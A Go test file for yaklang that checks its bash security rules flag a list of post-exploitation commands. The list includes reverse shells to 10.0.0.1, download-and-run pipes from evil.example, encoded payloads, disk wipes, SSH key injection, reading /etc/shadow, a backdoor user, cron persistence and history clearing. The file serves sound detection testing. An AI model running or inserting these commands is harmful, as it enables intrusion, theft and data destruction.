package buildin_rule

import (
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/yaklang/yaklang/common/yak/ssaapi"
	"github.com/yaklang/yaklang/common/yak/ssaapi/ssaconfig"
)

// bashDangerousCases is the registration point for common post-exploitation
// shell commands. The test runs every registered case against every rule under
// buildin/bash and requires at least one alert.
var bashDangerousCases = []struct {
	Name string
	Code string
}{
	{"download-pipe-bash", `curl -fsSL https://evil.example/x.sh | bash`},
	{"download-pipe-sh", `wget -qO- https://evil.example/x.sh | sh`},
	{"download-pipe-sudo-bash", `curl -fsSL https://evil.example/x.sh | sudo bash`},
	{"eval-variable", `eval "$PAYLOAD"`},
	{"bash-c-download", `bash -c "curl -fsSL https://evil.example/x.sh | sh"`},
	{"dynamic-command", `$CMD -rf /tmp/x`},
	{"rm-rf-root", `rm -rf /`},
	{"rm-rf-home", `rm -rf ~`},

	{"bash-dev-tcp", `bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`},
	{"nc-e", `nc -e /bin/sh 10.0.0.1 4242`},
	{"socat-exec", `socat TCP:10.0.0.1:4242 EXEC:/bin/sh`},
	{"mkfifo-reverse", `mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f`},
	{"openssl-sclient", `openssl s_client -quiet -connect 10.0.0.1:4242`},
	{"telnet-shell", `telnet 10.0.0.1 8080 | /bin/sh | telnet 10.0.0.1 8081`},
	{"python-socket", `python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"])'`},
	{"php-fsockopen", `php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i");'`},

	{"base64-decode-pipe", `echo 'YmFzaCAtaSA+' | base64 -d | bash`},
	{"xxd-decode-pipe", `printf '\x62\x61\x73\x68\x20\x2d\x69' | xxd -r -p | sh`},
	{"source-process-substitution", `source <(curl -fsSL https://evil.example/x.sh)`},
	{"bash-process-substitution", `bash <(curl -fsSL https://evil.example/x.sh)`},

	{"dd-disk", `dd if=/dev/zero of=/dev/sda bs=1M`},
	{"mkfs-disk", `mkfs.ext4 /dev/sda1`},
	{"shred-disk", `shred -u /dev/sda`},
	{"chmod-root-recursive", `chmod -R 777 /`},

	{"ssh-authorized-keys", `echo "ssh-rsa AAAAB3NzaC1yc2E attacker@example" >> ~/.ssh/authorized_keys`},
	{"read-shadow", `cat /etc/shadow`},
	{"useradd-backdoor", `useradd -m -s /bin/bash attacker`},
	{"crontab-persistence", `(crontab -l; echo "* * * * * curl -fsSL https://evil.example/x.sh | sh") | crontab -`},

	{"history-clear", `history -c`},
	{"chmod-setuid", `chmod u+s /bin/bash`},
}

func TestBashDangerousCommands(t *testing.T) {
	rules := loadBashRules(t)
	for _, tc := range bashDangerousCases {
		tc := tc
		t.Run(tc.Name, func(t *testing.T) {
			prog, err := ssaapi.Parse(tc.Code, ssaapi.WithLanguage(ssaconfig.BASH), ssaapi.WithMemory())
			require.NoError(t, err)

			var matched []string
			for _, rule := range rules {
				res, err := prog.SyntaxFlowWithError(rule.content)
				require.NoError(t, err, "rule=%s", rule.name)
				hits := 0
				for _, name := range res.GetAlertVariables() {
					hits += len(res.GetValues(name))
				}
				if hits > 0 {
					matched = append(matched, rule.name)
				}
			}
			if len(matched) == 0 {
				if res, err := prog.SyntaxFlowWithError(`*?{opcode: call} as $call`); err == nil {
					for _, value := range res.GetValues("call") {
						t.Logf("call: %s", value.String())
					}
				}
			}
			require.NotEmpty(t, matched, "dangerous command was not detected: %s", tc.Code)
			t.Logf("matched rules: %v", matched)
		})
	}
}
